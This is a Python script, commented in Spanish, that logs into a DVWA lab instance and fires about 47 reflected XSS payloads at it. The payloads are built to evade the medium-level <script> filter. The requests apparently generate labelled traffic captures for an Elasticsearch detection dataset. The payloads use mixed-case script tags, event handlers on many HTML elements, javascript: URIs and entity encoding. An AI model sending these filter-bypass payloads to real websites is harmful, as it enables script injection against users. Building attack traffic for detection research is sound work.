import requests
import time
import random

# =============================================
# CONFIGURACION
# =============================================
BASE_URL = "http://192.168.20.10"
LOGIN_URL = f"{BASE_URL}/login.php"
CREDENCIALES = {"username": "admin", "password": "password", "Login": "Login"}
PAUSA = 0.5

# =============================================
# PAYLOADS XSS ENTRENAMIENTO MEDIUM
# En nivel medium DVWA filtra la etiqueta <script>.
# Se usan tecnicas de bypass: otros tags HTML con eventos,
# codificacion, mayusculas mezcladas, etc.
# DISTINTOS a los de entrenamiento_xss.py (nivel low)
# =============================================

PAYLOADS_XSS_MEDIUM = [
    # Bypass con mayusculas/minusculas mezcladas
    "<ScRiPt>alert(1)</ScRiPt>",
    "<SCRIPT>alert(2)</SCRIPT>",
    "<Script>alert(3)</Script>",
    "<sCrIpT>alert(4)</sCrIpT>",
    # Otros tags con eventos — no filtrados en medium
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(2)>",
    "<img src=a onerror=alert(3)>",
    "<img src=b onerror=alert(4)>",
    "<img src=1 onerror=alert(5)>",
    "<IMG SRC=x ONERROR=alert(1)>",
    "<IMG src=x OnErRoR=alert(1)>",
    # SVG eventos
    "<svg onload=alert(1)>",
    "<svg onload=alert(2)>",
    "<SVG ONLOAD=alert(1)>",
    "<svg/onload=alert(1)>",
    "<svg/onload=alert(2)>",
    # Body y otros elementos
    "<body onload=alert(1)>",
    "<BODY ONLOAD=alert(1)>",
    "<body/onload=alert(1)>",
    "<body onresize=alert(1)>",
    # Input eventos
    "<input onfocus=alert(1) autofocus>",
    "<input onmouseover=alert(1)>",
    "<INPUT ONFOCUS=alert(1) AUTOFOCUS>",
    # Video y audio
    "<video src=x onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<VIDEO SRC=x ONERROR=alert(1)>",
    # Iframe
    "<iframe onload=alert(1)>",
    "<IFRAME ONLOAD=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    # Codificacion HTML de script
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    # Eventos de formulario
    "<form><button onclick=alert(1)>X</button></form>",
    "<form onsubmit=alert(1)><input type=submit></form>",
    # Etiquetas menos conocidas
    "<details open ontoggle=alert(1)>",
    "<DETAILS OPEN ONTOGGLE=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<MARQUEE ONSTART=alert(1)>",
    # Object y embed
    "<object data=javascript:alert(1)>",
    "<OBJECT DATA=javascript:alert(1)>",
    # Href eventos
    "<a href=javascript:alert(1)>click</a>",
    "<A HREF=javascript:alert(1)>click</A>",
    # Div con estilo
    "<div style=width:100px onmouseover=alert(1)>hover</div>",
    # Table eventos
    "<table onmouseover=alert(1)>",
    # Select
    "<select onchange=alert(1)><option>x</option></select>",
    # Meta refresh
    "<meta http-equiv=refresh content=0;url=javascript:alert(1)>",
    # Link
    "<link rel=stylesheet href=javascript:alert(1)>",
]

# =============================================
# FUNCIONES
# =============================================

def login(session):
    r = session.get(LOGIN_URL)
    token = None
    for line in r.text.split('\n'):
        if 'user_token' in line and 'value' in line:
            try:
                token = line.split('value=')[1].split("'")[1]
                break
            except:
                pass
    if token:
        CREDENCIALES['user_token'] = token
    r = session.post(LOGIN_URL, data=CREDENCIALES)
    if "Login failed" in r.text:
        print("ERROR: No se pudo hacer login en DVWA")
        return False
    print("Login correcto en DVWA")
    return True

def ataque_xss_medium(session):
    print("\n[*] Iniciando ataques XSS MEDIUM...")
    payloads = PAYLOADS_XSS_MEDIUM.copy()
    random.shuffle(payloads)
    ok = 0
    for payload in payloads:
        try:
            r = session.get(f"{BASE_URL}/vulnerabilities/xss_r/",
                            params={"name": payload})
            print(f"  XSS_M | {payload[:50]:<50} | status: {r.status_code}")
            ok += 1
            time.sleep(PAUSA)
        except Exception as e:
            print(f"  ERROR: {e}")
    print(f"[+] XSS Medium completado: {ok}/{len(payloads)} peticiones enviadas")

# =============================================
# MAIN
# =============================================

if __name__ == "__main__":
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})

    print("="*60)
    print("  ENTRENAMIENTO: XSS REFLECTED — NIVEL MEDIUM")
    print("  Target: " + BASE_URL)
    print("  Etiqueta Elasticsearch: 'xss'")
    print("  AVISO: Asegurate de que DVWA esta en nivel MEDIUM")
    print("  AVISO: Asegurate de tener tcpdump corriendo en el router")
    print("="*60)
    input("\nPulsa ENTER cuando tcpdump este corriendo...")

    if not login(session):
        exit(1)

    ataque_xss_medium(session)

    print("\n" + "="*60)
    print("  COMPLETADO.")
    print("  Para el tcpdump, guarda el pcap y subelo a Elasticsearch")
    print("  con etiqueta: 'xss'")
    print("="*60)
